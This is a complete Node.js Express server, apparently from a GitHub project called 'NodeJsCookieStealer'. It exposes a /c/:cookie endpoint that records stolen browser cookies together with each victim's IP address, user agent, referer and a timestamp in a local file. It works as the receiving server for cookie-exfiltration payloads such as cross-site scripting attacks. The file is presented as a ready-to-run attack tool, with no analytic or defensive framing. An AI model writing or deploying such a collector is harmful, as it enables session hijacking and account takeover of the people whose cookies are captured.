//  __     __     ______     ______   __     ______     __   __    
// /\ \  _ \ \   /\  __ \   /\__  _\ /\ \   /\  __ \   /\ "-.\ \   
// \ \ \/ ".\ \  \ \  __ \  \/_/\ \/ \ \ \  \ \ \/\ \  \ \ \-.  \  
//  \ \__/".~\_\  \ \_\ \_\    \ \_\  \ \_\  \ \_____\  \ \_\\"\_\ 
//   \/_/   \/_/   \/_/\/_/     \/_/   \/_/   \/_____/   \/_/ \/_/ 
//        https://github.com/TheWation/NodeJsCookieStealer

const express = require('express');
const app = express();
const fs = require('fs');
const { DateTime } = require('luxon');

app.get('/c/:cookie', (req, res) => {
  const date = DateTime.now().toFormat("yyyy/MM/dd HH:mm:ss");
  const ip = req.ip;
  const userAgent = req.headers['user-agent'];
  const referer = req.headers.referer;
  const cookie = req.params.cookie;

  const data = `[+] Date: ${date}\n[+] IP: ${ip}\n[+] UserAgent: ${userAgent}\n[+] Referer: ${referer}\n[+] Cookies: ${cookie}\n---\n`;

  fs.appendFile('cookies.txt', data, (err) => {
    if (err) {
      console.error(err);
      res.sendStatus(500);
    } else {
      res.sendStatus(200);
    }
  });
});

app.listen(3000, () => {
  console.log('Server started on port 3000');
});